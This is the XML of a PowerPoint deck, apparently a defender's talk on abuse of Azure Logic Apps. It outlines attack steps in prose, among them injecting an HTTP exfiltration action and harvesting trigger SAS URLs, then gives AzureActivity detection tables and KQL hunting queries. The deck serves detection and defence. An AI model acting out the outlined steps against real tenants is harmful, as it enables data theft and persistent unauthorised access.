                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>    Enumerate Logic Apps and their managed identity role assignments</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>    Download and modify a high-value workflow (one with blob/Graph/KV connectors)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>    Inject HTTP exfiltration action forwarding outputs to attacker endpoint</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>    Retrieve trigger SAS URL for persistent, credential-free invocation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="152609762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37E1D-820B-AF13-2FC7-09DCF7C94A43}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Detection — AzureActivity Key Operations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BB7EAE27-8538-32D9-2EB4-D18B38A51356}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2542205766"/>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739811573"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3810000">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2301903939"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3810000">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="170998631"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1"/>
                        <a:t>OperationName</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1"/>
                        <a:t>Meaning</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1"/>
                        <a:t>Threat Signal</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1601579191"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Microsoft.Logic/workflows/write</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Workflow created or updated</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Attacker editing workflow JSON</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1917333001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Microsoft.Logic/workflows/delete</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Workflow deleted</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Covering tracks or disruption</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1871503830"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Microsoft.Logic/workflows/triggers/listCallbackUrl/action</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Trigger SAS URL retrieved</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Harvesting trigger URL</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3009679334"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Microsoft.Logic/workflows/run/action</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Manual workflow run initiated</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Adversary-triggered execution</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="513392310"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Microsoft.Authorization/roleAssignments/write</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>RBAC assignment added</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Privilege escalation or persistence</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1203036714"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="716643">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Microsoft.Authorization/roleAssignments/delete</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>RBAC assignment removed</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400"/>
                        <a:t>Covering tracks</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2444689850"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="165980865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BCC09-7A8E-0AE7-1FEE-AD2549C7233C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Detection — AzureActivity Key Operations (cont.)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8172A4B3-5E4B-B141-66FC-EA4DC57A1FFE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600"/>
              <a:t>Key AzureActivity fields: Caller (who), CallerIpAddress (from where), ResourceId (which Logic App), ActivityStatus (success/fail), Authorization (RBAC action and scope)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="196138330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CF53D-51A4-2F13-1C42-88360EA66481}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>KQL — Detect Workflow Write Operations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B4C58AD-B89F-4C40-2D5F-C73AD87AB32E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>What to investigate: Any Caller that is not a known automation service principal. Interactive user accounts editing workflows are high-priority leads.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA1D6476-42D8-0862-FD07-B0F77CD67A35}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="3429000"/>
            <a:ext cx="11430000" cy="1661993"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>AzureActivity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where TimeGenerated &gt; ago(30d)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where OperationName ==</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    "Microsoft.Logic/workflows/write"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where ActivityStatus == "Succeeded"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| project TimeGenerated, Caller,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>          CallerIpAddress, ResourceId,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>          ResourceGroup, SubscriptionId</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99588910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1FF2F-0746-3938-3215-7FE22D0C1A55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>KQL — First-Time Callers (Anomaly Detection)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{955376F3-506B-087D-8938-AE6E95503EB7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>What this finds: Identities editing workflows for the first time in the last 30 days compared to a 90-day baseline - the highest-priority triage targets.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="223855601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D9E57-9BB9-4C0C-1823-71B8DB496C62}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>KQL — First-Time Callers (Anomaly Detection) (cont.)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0D7293F1-2F84-A993-DE66-74C815A1E4FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1"/>
              <a:t>Sample Kusto Query Language (KQL):</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FBD5D441-4CD1-8AEA-F1F2-076D31B74565}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="3556000"/>
            <a:ext cx="11430000" cy="2954655"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let known_editors = AzureActivity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where TimeGenerated between(ago(90d) .. ago(30d))</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where OperationName ==</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    "Microsoft.Logic/workflows/write"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where ActivityStatus == "Succeeded"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| summarize by Caller;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="1200">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>AzureActivity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where TimeGenerated &gt; ago(30d)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where OperationName ==</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    "Microsoft.Logic/workflows/write"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where ActivityStatus == "Succeeded"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| where Caller !in (known_editors)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>| project TimeGenerated, Caller,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>          CallerIpAddress, ResourceId, ResourceGroup</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281077202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5C774-C0EE-6EF5-8EF8-004FB8131F7B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>KQL — Trigger URL Retrieval and RBAC Changes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0074D62B-6F8C-8AC9-585B-A788697121A9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Detect trigger URL harvesting:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Detect RBAC changes on Logic App resources:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
